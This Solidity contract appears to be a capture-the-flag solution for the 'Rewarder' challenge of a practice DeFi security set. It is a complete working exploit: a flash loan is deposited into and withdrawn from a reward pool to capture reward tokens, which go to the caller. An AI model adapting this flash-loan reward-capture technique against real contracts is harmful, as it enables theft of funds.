// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title HackTheRewarderPool
 * @author Camillebzd
 */
contract HackTheRewarderPool {
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool theRewarderPool;

    constructor(address _flashLoanerPool, address _theRewarderPool) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
    }

    function attack(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        theRewarderPool.rewardToken().transfer(msg.sender, theRewarderPool.rewardToken().balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken liquidityToken = flashLoanerPool.liquidityToken();
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}